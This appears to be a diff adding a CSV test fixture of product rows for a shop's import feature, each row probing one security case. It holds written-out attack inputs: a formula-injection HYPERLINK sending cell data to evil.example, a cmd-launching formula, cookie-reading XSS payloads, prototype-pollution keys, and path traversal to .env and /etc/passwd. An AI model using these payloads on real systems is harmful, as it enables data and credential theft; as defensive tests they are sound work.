@@ -1,0 +1,8 @@
+sku,name,price,stock,category,description,images,attr:__proto__,attr:constructor
+SEC-FORMULA,=HYPERLINK("http://evil.example/?d="&A1;"Click"),10.00,1,gifts,+cmd|' /C calc'!A0,,,
+SEC-HTML,<img src=x onerror=alert(document.cookie)>,10.00,1,gifts,<script>alert(1)</script>Plain text stays,,,
+SEC-PROTO,Prototype test,10.00,1,gifts,,,polluted,polluted
+SEC-TRAVERSAL,Traversal test,10.00,1,gifts,,../../.env.demo,,
+SEC-ABSOLUTE,Absolute path test,10.00,1,gifts,,/etc/passwd,,
+SEC-UPLOADS,Uploads escape test,10.00,1,gifts,,/uploads/../../.env.demo,,
+SEC-HTTP,Plain http image,10.00,1,gifts,,http://example.com/a.png,,
